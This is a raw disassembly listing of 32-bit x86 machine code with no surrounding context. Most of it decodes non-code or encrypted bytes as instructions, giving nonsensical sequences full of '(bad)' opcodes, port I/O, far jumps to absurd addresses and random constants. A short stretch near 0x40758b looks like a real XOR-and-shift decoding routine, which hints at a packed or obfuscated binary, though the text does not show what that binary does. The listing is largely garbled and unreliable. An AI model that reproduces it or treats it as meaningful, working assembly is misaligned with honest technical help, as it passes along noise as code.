  4074ad:	xchg   ebp,eax
  4074ae:	ret    
  4074af:	mov    ds:0x9e919521,al
  4074b4:	in     al,0x3
  4074b6:	adc    BYTE PTR [ebp-0x5c],cl
  4074b9:	mov    dh,0xcc
  4074bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074bc:	int3   
  4074bd:	mov    dh,0x6c
  4074bf:	out    0x18,eax
  4074c1:	xor    dh,bl
  4074c3:	jb     0x40744b
  4074c5:	adc    ecx,DWORD PTR [ebp+0x1]
  4074c8:	xor    al,0x8a
  4074ca:	mov    bl,0xf
  4074cc:	fdivr  QWORD PTR [eax-0x4b429cc0]
  4074d2:	(bad)  
  4074d3:	shr    dh,1
  4074d5:	mov    dh,0xc6
  4074d7:	push   ss
  4074d8:	pop    ss
  4074d9:	out    0xd4,al
  4074db:	sbb    eax,0xe395d3b9
  4074e0:	nop
  4074e1:	das    
  4074e2:	mov    edx,0x8bdc07e7
  4074e7:	dec    esp
  4074e8:	and    al,0xe2
  4074ea:	pushf  
  4074eb:	push   edi
  4074ec:	arpl   cx,cx
  4074ee:	sbb    ch,BYTE PTR [ecx+0x7dbac74f]
  4074f4:	xor    eax,0x2f4eb83f
  4074f9:	pop    esi
  4074fa:	add    edx,eax
  4074fc:	push   0xffffff97
  4074fe:	xchg   ecx,eax
  4074ff:	add    al,0x46
  407501:	outs   dx,BYTE PTR ds:[esi]
  407502:	popf   
  407503:	xor    BYTE PTR [ecx+0x5f],dl
  407506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407507:	xlat   BYTE PTR ds:[ebx]
  407508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407509:	add    ebp,ebp
  40750b:	push   ecx
  40750c:	adc    edi,eax
  40750e:	test   al,0xed
  407510:	iret   
  407511:	lods   eax,DWORD PTR ds:[esi]
  407512:	dec    esp
  407513:	pop    edi
  407514:	push   esp
  407515:	sahf   
  407516:	xchg   esp,eax
  407517:	lahf   
  407518:	or     eax,0x3c8181fe
  40751e:	jns    0x4074bc
  407520:	fsub   DWORD PTR [edi]
  407522:	fcomp  DWORD PTR [ebx-0x6d5530f8]
  407528:	fldpi  
  40752a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752b:	pop    edx
  40752c:	out    0x59,al
  40752e:	sti    
  40752f:	stos   DWORD PTR es:[edi],eax
  407530:	dec    ebp
  407531:	lea    ecx,[ebp+0x4f]
  407534:	jl     0x4074f0
  407536:	mov    ecx,0xdab23869
  40753b:	sub    eax,DWORD PTR [eax+0x2e]
  40753e:	cdq    
  40753f:	test   DWORD PTR [ebx-0x2a],ebp
  407542:	icebp  
  407543:	add    BYTE PTR [ebx-0x79d93353],ch
  407549:	jmp    0x776d:0x65ac35b5
  407550:	jne    0x4075a3
  407552:	mov    eax,0xa9be30ca
  407557:	jg     0x40758e
  407559:	cmp    BYTE PTR [ecx+0x4bb5bf28],al
  40755f:	mov    cl,0x51
  407561:	and    al,0x1f
  407563:	jecxz  0x407510
  407565:	mov    ah,0x6b
  407567:	inc    edx
  407568:	dec    eax
  407569:	adc    esp,DWORD PTR [ebp+0x23582f0c]
  40756f:	loop   0x4075a3
  407571:	push   ss
  407572:	loope  0x407531
  407574:	loop   0x4075c2
  407576:	add    ah,BYTE PTR [esi-0x10]
  407579:	mov    dl,0x93
  40757b:	mov    cl,0xba
  40757d:	dec    ebx
  40757e:	fnstenv [edi+0x2ffeed5b]
  407584:	jl     0x407560
  407586:	out    dx,al
  407587:	retf   0xfba2
  40758a:	dec    esi
  40758b:	mov    ebp,DWORD PTR [ebp+0x333d92e0]
  407591:	mov    ecx,DWORD PTR [ebp-0x4c]
  407594:	shrd   eax,ecx,0x2
  407598:	shr    ecx,0x2
  40759b:	mov    cx,ax
  40759e:	mov    eax,DWORD PTR [ebp-0x50]
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x67
  407613:	fst    QWORD PTR [ebp+0x187d17bc]
  407619:	sbb    BYTE PTR [esi-0x77e7e7ee],bl
  40761f:	dec    edx
  407620:	cld    
  407621:	fucomip st,st(0)
  407623:	mov    bh,0x2f
  407625:	mov    al,0x7c
  407627:	adc    dh,BYTE PTR [eax-0x32]
  40762a:	enter  0xaed6,0xd9
  40762e:	push   0xffffffbf
  407630:	cmp    DWORD PTR [edi],edi
  407632:	inc    esi
  407633:	rol    esp,0x93
  407636:	pop    ebp
  407637:	and    al,0x88
  407639:	add    eax,0xf9aa510f
  40763e:	fstp   QWORD PTR [ebx+0x65222cea]
  407644:	add    ebp,DWORD PTR [ebx]
  407646:	ficom  DWORD PTR [esi+0x5eaedbb2]
  40764c:	das    
  40764d:	int3   
  40764e:	clc    
  40764f:	mov    ecx,0xe66bc14e
  407654:	adc    eax,DWORD PTR [ebx]
  407656:	call   0xd9ab:0x45493411
  40765d:	adc    eax,0x143564e6
  407662:	and    eax,0x7e4e1f2
  407667:	mov    al,ds:0xe6e944d3
  40766c:	adc    BYTE PTR [esi+0x11aaac67],cl
  407672:	arpl   WORD PTR [eax+ebx*8],cx
  407675:	mov    bh,0x23
  407677:	ja     0x40763c
  407679:	add    DWORD PTR [ecx-0x69],0x51ac4103
  407680:	push   ss
  407681:	scas   al,BYTE PTR es:[edi]
  407682:	outs   dx,BYTE PTR ds:[esi]
  407683:	js     0x40765a
  407685:	imul   esi,DWORD PTR [esi],0xffffff8f
  407688:	jnp    0x40763b
  40768a:	sbb    cl,dl
  40768c:	push   ebp
  40768d:	push   esi
  40768e:	inc    eax
  40768f:	dec    edx
  407690:	mov    ch,0x31
  407692:	xchg   ebx,eax
  407693:	jno    0x40763f
  407695:	pop    eax
  407696:	into   
  407697:	out    dx,al
  407698:	stos   DWORD PTR es:[edi],eax
  407699:	inc    ecx
  40769a:	or     BYTE PTR [eax-0x465e59fe],dh
  4076a0:	sub    BYTE PTR [edi+esi*1],dh
  4076a3:	inc    esi
  4076a4:	(bad)  
  4076a5:	xor    dh,BYTE PTR [ebx+0x7fa3779f]
  4076ab:	or     al,0xcd
  4076ad:	retf   
  4076ae:	xchg   bl,ah
  4076b0:	stc    
  4076b1:	lods   eax,DWORD PTR ds:[esi]
  4076b2:	xchg   BYTE PTR [ecx+0x69],ch
  4076b5:	cwde   
  4076b6:	push   edx
  4076b7:	jns    0x407678
  4076b9:	lock pop esi
  4076bb:	repz fdiv QWORD PTR [ebx]
  4076be:	js     0x40766d
  4076c0:	jecxz  0x40772d
  4076c2:	nop
  4076c3:	es cmp bh,bh
  4076c6:	lea    esi,[ebp-0x63406f81]
  4076cc:	or     eax,0xb49db685
  4076d1:	or     BYTE PTR [ecx+ecx*2-0x3730d567],ah
  4076d8:	push   esp
  4076d9:	jb     0x40766b
  4076db:	les    ebp,FWORD PTR [ebx+0x37]
  4076de:	in     al,0x36
  4076e0:	pop    ss
  4076e1:	jbe    0x407730
  4076e3:	mov    dl,dh
  4076e5:	push   edx
  4076e6:	fnstenv [edi-0x78]
  4076e9:	in     al,0xdb
  4076eb:	das    
  4076ec:	in     al,dx
  4076ed:	outs   dx,DWORD PTR ds:[esi]
  4076ee:	mov    DWORD PTR [eax+0x26],0x9b18e2b5
  4076f5:	mov    ebp,0x2367f66a
  4076fa:	fisubr WORD PTR [esi+0x791aac92]
  407700:	mov    BYTE PTR [eax-0x3e],dh
  407703:	mov    ds:0x2e331d11,eax
  407708:	repnz cmp ecx,DWORD PTR es:[edi]
  40770c:	lock mov ds:0x56122b2c,eax
  407712:	les    edx,FWORD PTR [esi-0x54]
  407715:	cld    
  407716:	jns    0x407766
  407718:	pop    eax
  407719:	hlt    
  40771a:	sbb    DWORD PTR [edi+0x27330228],0x34481bd8
  407724:	mov    bl,0xc0
  407726:	in     eax,0xa6
  407728:	pop    es
  407729:	rcr    DWORD PTR [ecx],0xb4
  40772c:	jg     0x40779c
  40772e:	mov    ebp,0xbb32409e
  407733:	cmp    esp,DWORD PTR [ebx+0x6e14a70f]
  407739:	and    al,0x39
  40773b:	out    dx,eax
  40773c:	sar    BYTE PTR ds:0x6ee2dd94,1
  407742:	add    al,0xab
  407744:	test   eax,0x4040ee99
  407749:	push   ecx
  40774a:	nop
  40774b:	cmp    bl,cl
  40774d:	push   ds
  40774e:	push   cs
  40774f:	pop    esi
  407750:	mov    ds:0x1b76eb3b,eax
  407755:	xchg   esp,eax
  407756:	outs   dx,DWORD PTR ds:[esi]
  407757:	mov    edx,0xdc95095e
  40775c:	fwait
  40775d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40775e:	test   al,0x21
  407760:	cmp    DWORD PTR [ebp+0x4d],0xffffffce
  407764:	sub    eax,0x5560f57b
  407769:	in     al,dx
  40776a:	cld    
  40776b:	fcomp  st(3)
  40776d:	add    al,0xc4
  40776f:	ds inc edx
  407771:	je     0x407747
  407773:	sbb    eax,0x2cb887e2
  407778:	adc    edx,DWORD PTR [edx-0x258d72b9]
  40777e:	call   0x9aa38f1c
  407783:	dec    edi
  407784:	dec    esi
  407785:	ss and esi,0xec99d28b
  40778c:	es jl  0x40776a
  40778f:	cmp    BYTE PTR [esi-0x39],al
  407792:	shl    BYTE PTR [esi+0x15ab9eae],cl
  407798:	int    0x78
  40779a:	rol    DWORD PTR [edx+edx*8],0xc4
  40779e:	aad    0x85
  4077a0:	mov    al,ds:0xa80c874b
  4077a5:	jne    0x40780c
  4077a7:	div    BYTE PTR [eax-0x2d]
  4077aa:	loope  0x4077c6
  4077ac:	outs   dx,BYTE PTR ds:[esi]
  4077ad:	lock mov ah,0x5c
  4077b0:	or     eax,0x94da9e07
  4077b5:	popa   
  4077b6:	add    bh,BYTE PTR [edx]
  4077b8:	sbb    DWORD PTR ds:0x44880503,esp
  4077be:	mov    al,ds:0x2018cbb1
  4077c3:	call   0x7a0042e9
  4077c8:	pop    edi
  4077c9:	int3   
  4077ca:	rol    DWORD PTR [ecx+0x31],0xd8
  4077ce:	and    ebx,DWORD PTR cs:[ebp-0x34c0dfad]
  4077d5:	ror    BYTE PTR [ecx+0x76],cl
  4077d8:	push   ecx
  4077d9:	jmp    0x4077bd
  4077db:	imul   esp,DWORD PTR [esp+ebp*4-0x6c9f4ed4],0xca3d4f7a
  4077e6:	push   ebx
  4077e7:	dec    esi
  4077e8:	or     eax,0x27b6f3ae
  4077ed:	sub    edi,ebx
  4077ef:	xor    bh,BYTE PTR [eax+0x1d916f33]
  4077f5:	in     al,0x4e
  4077f7:	fwait
  4077f8:	mov    esp,0xb173a3b4
  4077fd:	inc    edi
  4077fe:	in     al,dx
  4077ff:	push   ebx
  407800:	pop    edi
  407801:	retf   0x86f0
  407804:	push   0x2d
  407806:	inc    eax
  407807:	mov    al,ds:0x77aa378a
  40780c:	rol    DWORD PTR [esi+0x30],cl
  40780f:	out    0x3,eax
  407811:	fld    QWORD PTR [eax+0x4dc57fb9]
  407817:	ret    
  407818:	sbb    eax,0x6875a087
  40781d:	shl    DWORD PTR [eax-0x4d34f669],0x34
  407824:	inc    ebp
  407825:	cs cld 
  407827:	mov    esp,ss
  407829:	cmp    al,0xf9
  40782b:	push   ebx
  40782c:	call   0x96876a36
  407831:	mov    ah,0x73
  407833:	sbb    al,0x12
  407835:	jg     0x407876
  407837:	idiv   BYTE PTR [edi+0x3b53dd6]
  40783d:	mov    bh,0x2f
  40783f:	mov    al,0x3d
  407841:	ret    0x5b46
  407844:	(bad)  
  407845:	outs   dx,BYTE PTR ds:[esi]
  407846:	mov    bl,0xac
  407848:	pop    edi
  407849:	or     al,0xc4
  40784b:	imul   esi,DWORD PTR [ebx-0x56],0xdd0f6aa0
  407852:	mov    al,0xdc
  407854:	shr    al,0xd9
  407857:	outs   dx,BYTE PTR ds:[esi]
  407858:	cmp    ebp,DWORD PTR [edi-0x657d5de8]
  40785e:	fimul  WORD PTR [edx+0x5910fc4d]
  407864:	imul   edi,DWORD PTR [esi+ecx*1],0x8c72126d
  40786b:	pushf  
  40786c:	add    bh,cl
  40786e:	clc    
  40786f:	add    eax,0xbd61b0a2
  407874:	mov    ds:0x12aa0dbf,eax
  407879:	xlat   BYTE PTR ds:[ebx]
  40787a:	jmp    0x407815
  40787c:	mov    bh,BYTE PTR [esi+0x1e]
  40787f:	cmp    ah,BYTE PTR [ecx+0x4]
  407882:	xor    al,BYTE PTR [esi]
  407884:	push   ds
  407885:	xor    dh,BYTE PTR [ebx-0x1a5051c]
  40788b:	stos   DWORD PTR es:[edi],eax
  40788c:	mov    al,ds:0x978dc9ab
  407891:	(bad)  
  407892:	std    
  407893:	fwait
  407894:	sub    ch,BYTE PTR [ecx+0x66858d7e]
  40789a:	lds    ebp,FWORD PTR [eax+0x26]
  40789d:	arpl   WORD PTR [esi+0x5a7a3510],sp
  4078a3:	xor    al,0xf6
  4078a5:	pop    esp
  4078a6:	mov    edx,0x2e3c640b
  4078ab:	bound  ebp,QWORD PTR [edx-0x19bf2b56]
  4078b1:	mov    ebp,0x6dc97359
  4078b6:	xor    esi,DWORD PTR [esi+0x11793009]
  4078bc:	pop    esp
  4078bd:	fistp  WORD PTR [esi+0x43b34425]
  4078c3:	(bad)  
  4078c4:	sub    dl,ch
  4078c6:	repz lea esi,[eax]
  4078c9:	sub    BYTE PTR [ebx-0x2927a8c7],dh
  4078cf:	fisubr WORD PTR [edi+0x14]
  4078d2:	out    dx,eax
  4078d3:	inc    BYTE PTR [eax+0x1f4b422e]
  4078d9:	int    0x8d
  4078db:	push   eax
  4078dc:	push   0xffffffa3
  4078de:	xchg   esi,eax
  4078df:	sub    BYTE PTR [edi-0x448a3f65],cl
  4078e5:	pop    esi
  4078e6:	sbb    eax,0xc9dc4efe
  4078eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ec:	xor    bl,dh
  4078ee:	add    esi,DWORD PTR [ecx+0x9a89d5b]
  4078f4:	sub    DWORD PTR [eax],ebx
  4078f6:	xor    DWORD PTR [edi+0x6e],ecx
  4078f9:	cmp    BYTE PTR [esi+0xd],0x76
  4078fd:	push   esp
  4078fe:	adc    BYTE PTR [eax-0x35],al
  407901:	sbb    BYTE PTR [ebx-0x6d],bl
  407904:	push   0x72
  407906:	out    0x2,eax
  407908:	ins    BYTE PTR es:[edi],dx
  407909:	pop    ebp
  40790a:	mov    ch,0xf8
  40790c:	adc    eax,0xf291182d
  407911:	daa    
  407912:	in     al,0xfb
  407914:	fisubr WORD PTR [ebx]
  407916:	lock call 0xacdd:0x4c1d0beb
  40791e:	fistp  QWORD PTR [edi]
  407920:	rcl    DWORD PTR [ebx+0x655b5a8e],1
  407926:	int    0x6e
  407928:	lahf   
  407929:	mov    dl,0xb
  40792b:	js     0x40790f
  40792d:	mov    DWORD PTR [edi],edx
  40792f:	jns    0x407938
  407931:	scas   al,BYTE PTR es:[edi]
  407932:	push   edx
  407933:	jp     0x40794d
  407935:	cmp    eax,DWORD PTR [ecx]
  407937:	lock sbb esp,DWORD PTR [ebp+0x27]
  40793b:	push   eax
  40793c:	mov    WORD PTR [edi-0x28f272c7],fs
  407942:	in     al,0x17
  407944:	pop    eax
  407945:	inc    esi
  407946:	jmp    0xe0f6e7b1
  40794b:	push   cs
  40794c:	jmp    0x40790e
  40794e:	fbstp  TBYTE PTR [esi+eiz*1]
  407951:	aas    
  407952:	cmc    
  407953:	and    BYTE PTR [eax],ah
  407955:	lods   al,BYTE PTR ds:[esi]
  407956:	or     eax,0xc95b241f
  40795b:	push   esp
  40795c:	dec    BYTE PTR [edx+0x43]
  40795f:	repz out dx,al
  407961:	jb     0x4078e7
  407963:	push   esi
  407964:	sub    BYTE PTR [edx+0x640952cd],dh
  40796a:	mov    esi,0x368b7971
  40796f:	sahf   
  407970:	mov    dh,0xb3
  407972:	fidiv  DWORD PTR [edi-0x35510194]
  407978:	sub    edi,DWORD PTR [edi*2+0x3fbdc3a1]
  40797f:	ins    DWORD PTR es:[edi],dx
  407980:	xchg   edi,eax
  407981:	test   BYTE PTR [esi-0x44515e1c],al
  407987:	pop    edx
  407988:	pop    edi
  407989:	out    dx,eax
  40798a:	imul   ebp,eax,0x35971c02
  407990:	inc    eax
  407991:	dec    edx
  407992:	xchg   ecx,eax
  407993:	(bad)  
  407994:	imul   eax,DWORD PTR [esi+0x5f],0xffffffca
  407998:	jge    0x4079ec
  40799a:	pop    es
  40799b:	sti    
  40799c:	jne    0x407a02
  40799e:	addr16 cwde 
  4079a0:	mov    edx,0xb38aca9
  4079a5:	jmp    0x4079f1
  4079a7:	scas   al,BYTE PTR es:[edi]
  4079a8:	data16 sub al,0xfd
  4079ab:	popf   
  4079ac:	(bad)  [ecx-0x33]
  4079af:	xchg   edx,eax
  4079b0:	push   esp
  4079b1:	es enter 0x1f34,0xe2
  4079b6:	jns    0x40798c
  4079b8:	call   0x5de4:0x3bf98bc1
  4079bf:	push   sp
  4079c1:	mov    bl,0x4f
  4079c3:	xlat   BYTE PTR ds:[ebx]
  4079c4:	ret    
  4079c5:	sbb    DWORD PTR [ecx+0x24e77592],eax
  4079cb:	scas   al,BYTE PTR es:[edi]
  4079cc:	(bad)  
  4079cd:	sbb    al,0xab
  4079cf:	xchg   esp,eax
  4079d0:	gs push eax
  4079d2:	adc    DWORD PTR [esi-0x6e],ecx
  4079d5:	xor    al,0xe1
  4079d7:	mov    ds:0xa28c13c2,al
  4079dc:	into   
  4079dd:	and    bh,dl
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079e7
  4079f4:	pop    es
  4079f5:	pop    ebx
  4079f6:	jo     0x407995
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x56181812],bl
  407a00:	test   al,0x29
  407a02:	lods   eax,DWORD PTR cs:[esi]
  407a04:	push   ds
  407a05:	mov    esi,0x7f1d7db5
  407a0a:	dec    ecx
  407a0b:	mov    edi,0x3c329969
  407a10:	retf   
  407a11:	setle  ch
  407a14:	add    al,0xba
  407a16:	inc    cx
  407a18:	inc    ecx
  407a19:	mov    dh,0xa
  407a1b:	xor    al,0x45
  407a1d:	or     bl,bl
  407a1f:	and    DWORD PTR [ebp-0x72ae7820],edx
  407a25:	xor    BYTE PTR [edx+0x5dc1f8bd],0xfb
  407a2c:	stos   BYTE PTR es:[edi],al
  407a2d:	rcr    DWORD PTR [edx+0x319e7ac5],0x73
  407a34:	cmp    al,BYTE PTR [eax-0x9]
  407a37:	retf   0x6f78
  407a3a:	sub    edi,DWORD PTR [ebx]
  407a3c:	into   
  407a3d:	xchg   ecx,eax
  407a3e:	mov    bh,0x25
  407a40:	sbb    ebx,esi
  407a42:	sub    DWORD PTR [edi],0x40e05063
  407a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a49:	loop   0x407ac5
  407a4b:	ins    BYTE PTR es:[edi],dx
  407a4c:	retf   0x4b29
  407a4f:	iret   
  407a50:	bound  ebx,QWORD PTR es:[edi-0x1cafaa1d]
  407a57:	dec    eax
  407a58:	cli    
  407a59:	mov    esp,0x21d09235
  407a5e:	xor    al,0xb
  407a60:	xchg   edi,eax
  407a61:	iret   
  407a62:	add    DWORD PTR [ebx+ebx*1-0x5d],eax
  407a66:	mov    esp,0x2d4a4f5b
  407a6b:	xchg   ebx,eax
  407a6c:	pusha  
  407a6d:	retf   
  407a6e:	jl     0x407a0c
  407a70:	addr16 mov dh,0x0
  407a73:	call   0x8ef82bf0
  407a78:	aas    
  407a79:	std    
  407a7a:	in     eax,0x42
  407a7c:	inc    esp
  407a7d:	daa    
  407a7e:	(bad)  
  407a7f:	cmc    
  407a80:	inc    ecx
  407a81:	out    dx,eax
  407a82:	stos   BYTE PTR es:[edi],al
  407a83:	mov    cl,cl
  407a85:	sahf   
  407a86:	dec    edi
  407a87:	fild   QWORD PTR [ebx+0x65e35cc8]
  407a8d:	or     eax,0x7e20adfe
  407a92:	pop    ebx
  407a93:	inc    eax
  407a94:	std    
  407a95:	push   edx
  407a96:	inc    esi
  407a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a99:	add    DWORD PTR [ecx],edx
  407a9b:	imul   DWORD PTR [ebx-0x57715c16]
  407aa1:	or     ah,BYTE PTR [esi-0x72]
  407aa4:	into   
  407aa5:	sbb    ah,dl
  407aa7:	xchg   esp,eax
  407aa8:	jo     0x407a32
  407aaa:	mov    ecx,0x3846bce7
  407aaf:	test   BYTE PTR [ebp+ebx*8-0x60],cl
  407ab3:	in     eax,0x32
  407ab5:	fs nop
  407ab7:	gs ds jp 0x407a4a
  407abb:	pop    ebp
  407abc:	dec    edi
  407abd:	push   0xba5ee96
  407ac2:	(bad)  
  407ac3:	out    dx,al
  407ac4:	jmp    0xfe428d21
  407ac9:	(bad)  
  407aca:	xchg   ebx,eax
  407acb:	loopne 0x407b1b
  407acd:	retf   0x515
  407ad0:	stos   BYTE PTR es:[edi],al
  407ad1:	xor    ebx,DWORD PTR ds:0x878dc46a
  407ad7:	imul   ebx,esp,0x7128e2f8
  407add:	call   0x483a:0xccc98214
  407ae4:	lock call 0x51e1483
  407aea:	cmp    bh,dl
  407aec:	dec    ebp
  407aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aee:	mov    bl,0xb
  407af0:	mov    bh,0xbf
  407af2:	mov    DWORD PTR [ebx+0x51],eax
  407af5:	add    edx,DWORD PTR [eax+0x12]
  407af8:	jg     0x407aa8
  407afa:	and    bl,BYTE PTR [ebx+0x12ef46e8]
  407b00:	and    al,0x74
  407b02:	jmp    0xcca6e8c5
  407b07:	mov    bl,0xab
  407b09:	or     al,0x96
  407b0b:	hlt    
  407b0c:	dec    eax
  407b0d:	inc    ecx
  407b0e:	add    BYTE PTR [ebp-0x5c],bl
  407b11:	test   eax,0x34482464
  407b16:	xor    dl,BYTE PTR [ecx+esi*4-0xc]
  407b1a:	mov    ah,0x41
  407b1c:	imul   esi,DWORD PTR [edx],0x3dfebb66
  407b22:	clc    
  407b23:	cld    
  407b24:	mov    DWORD PTR [ecx-0x1d],0x5aa81437
  407b2b:	int    0xbf
  407b2d:	arpl   ax,sp
  407b2f:	pop    esp
  407b30:	mov    WORD PTR [esp+ecx*2+0x74],gs
  407b34:	pusha  
  407b35:	sti    
  407b36:	fucomip st,st(3)
  407b38:	mov    ecx,DWORD PTR [ecx+0x3a46c600]
  407b3e:	mov    edx,DWORD PTR [eax]
  407b40:	std    
  407b41:	sar    bl,cl
  407b43:	loopne 0x407b51
  407b45:	out    0xe3,al
  407b47:	mov    esp,ds
  407b49:	dec    edx
  407b4a:	mov    esp,0xe03bfff8
  407b4f:	adc    BYTE PTR [ebp+0x5335aa6a],dl
  407b55:	cmp    eax,0xb3e15024
  407b5a:	inc    esi
  407b5b:	(bad)  
  407b5c:	out    dx,eax
  407b5d:	data16 sbb bl,BYTE PTR [edx+0x11]
  407b61:	stos   DWORD PTR es:[edi],eax
  407b62:	jl     0x407b2e
  407b64:	xchg   ebx,eax
  407b65:	pop    edi
  407b66:	call   0x3114675c
  407b6b:	(bad)  
  407b6c:	popa   
  407b6d:	int3   
  407b6e:	and    eax,0x9815ce04
  407b73:	test   BYTE PTR [esi-0xb],0x8d
  407b77:	cmp    DWORD PTR [ebx-0x1],0x85a2e655
  407b7e:	jo     0x407bee
  407b80:	pop    ebx
  407b81:	dec    ecx
  407b82:	inc    eax
  407b83:	les    ebx,FWORD PTR [ebx-0x50]
  407b86:	retf   0xf0c0
  407b89:	xchg   ebp,eax
  407b8a:	iret   
  407b8b:	inc    DWORD PTR [ebp-0x53]
  407b8e:	push   edi
  407b8f:	adc    BYTE PTR [esi-0x1ab81a70],0xf8
  407b96:	lods   eax,DWORD PTR ds:[esi]
  407b97:	sub    BYTE PTR [esi-0x13],al
  407b9a:	sub    eax,DWORD PTR [eax]
  407b9c:	pop    ss
  407b9d:	sbb    al,0xeb
  407b9f:	and    al,0xd9
  407ba1:	jmp    0x1d9c343
  407ba6:	xchg   edx,eax
  407ba7:	add    al,0x4a
  407ba9:	mov    cl,0xfc
  407bab:	fstp   TBYTE PTR [edi]
  407bad:	repz call 0x570a55c6
  407bb3:	dec    esi
  407bb4:	xlat   BYTE PTR ds:[ebx]
  407bb5:	jo     0x407bde
  407bb7:	push   edi
  407bb8:	sar    BYTE PTR [ebp+eiz*1-0x7923ef9c],1
  407bbf:	cmp    ebx,edi
  407bc1:	add    ecx,DWORD PTR [ebx]
  407bc3:	js     0x407bd9
  407bc5:	shl    dl,0xf7
  407bc8:	into   
  407bc9:	jg     0x407bba
  407bcb:	cmp    al,0x8e
  407bcd:	dec    ecx
  407bce:	cs out 0xce,al
  407bd1:	clc    
  407bd2:	dec    eax
  407bd3:	bound  ebp,QWORD PTR [eax]
  407bd5:	in     al,0x72
  407bd7:	adc    BYTE PTR [ebx-0xd],dl
  407bda:	shl    ebp,0x62
  407bdd:	add    eax,0x41935b22
  407be2:	xor    BYTE PTR [edi-0x4687bcd4],dl
  407be8:	imul   ecx,DWORD PTR [edi+edx*4+0x54c0a2d7],0xf139b27
  407bf3:	inc    edi
  407bf4:	and    ah,BYTE PTR [edx-0x4d]
  407bf7:	idiv   BYTE PTR [esi+0x54]
  407bfa:	xchg   ebx,eax
  407bfb:	repnz outs dx,DWORD PTR ds:[esi]
  407bfd:	mov    esp,0x38709641
  407c02:	(bad)  
  407c03:	cmp    al,cl
  407c05:	pop    es
  407c06:	bound  eax,QWORD PTR [eax]
  407c08:	mov    al,ds:0x1c48d5d7
  407c0d:	dec    edx
  407c0e:	je     0x407c2e
  407c10:	cmp    eax,0x345666bd
  407c15:	push   0xb9d02c14
  407c1a:	dec    ecx
  407c1b:	add    BYTE PTR es:[eax],ch
  407c1e:	popf   
  407c1f:	(bad)  
  407c20:	in     eax,0x7e
  407c22:	dec    edx
  407c23:	add    edi,ebx
  407c25:	ja     0x407c2a
  407c27:	and    edx,DWORD PTR [ebp+0x33]
  407c2a:	pop    ecx
  407c2b:	in     al,0x8b
  407c2d:	mov    edi,0x724bf163
  407c32:	sub    ecx,ebp
  407c34:	cmp    ah,bl
  407c36:	pop    ecx
  407c37:	aaa    
  407c38:	or     DWORD PTR [eax+0x65],0xb83b728e
  407c3f:	mov    ch,0x52
  407c41:	pop    esp
  407c42:	repnz test al,0xf3
  407c45:	jbe    0x407bcb
  407c47:	push   esi
  407c48:	or     BYTE PTR ds:0x3465f76c,dl
  407c4e:	hlt    
  407c4f:	jecxz  0x407c4e
  407c51:	and    ah,al
  407c53:	lds    ecx,FWORD PTR [ebp+0x7f32524a]
  407c59:	out    dx,al
  407c5a:	bound  ebx,QWORD PTR [edi+0x68]
  407c5d:	out    dx,al
  407c5e:	sub    DWORD PTR [edi],esp
  407c60:	jo     0x407c5a
  407c62:	mov    dl,BYTE PTR [esi+0x63]
  407c65:	inc    ecx
  407c66:	adc    DWORD PTR [edi+ecx*4+0x3916d41b],ebx
  407c6d:	mov    bl,0x15
  407c6f:	test   dl,dl
  407c71:	mov    ch,0x16
  407c73:	das    
  407c74:	fldenv [edx]
  407c76:	aaa    
  407c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c78:	dec    esi
  407c79:	rcr    edi,0x43
  407c7c:	mov    ds:0xf70e2df3,al
  407c81:	imul   edx,DWORD PTR [ebx-0x13],0x34dd80dd
  407c88:	je     0x407c0d
  407c8a:	daa    
  407c8b:	dec    edx
  407c8c:	sbb    esp,DWORD PTR cs:[ecx]
  407c8f:	jmp    0x5028:0x4f1df626
  407c96:	scas   al,BYTE PTR es:[edi]
  407c97:	and    DWORD PTR [ebp+0x76],edi
  407c9a:	sbb    ch,BYTE PTR [ecx+0x23]
  407c9d:	stos   DWORD PTR es:[edi],eax
  407c9e:	sbb    DWORD PTR [edx+0x2907ec72],ebx
  407ca4:	mov    ds:0x6007c3cd,eax
  407ca9:	les    edx,FWORD PTR [ebx+esi*2]
  407cac:	dec    edi
  407cad:	imul   eax,DWORD PTR [ebx],0xffffffa2
  407cb0:	dec    edx
  407cb1:	ret    0x141b
  407cb4:	xlat   BYTE PTR ds:[ebx]
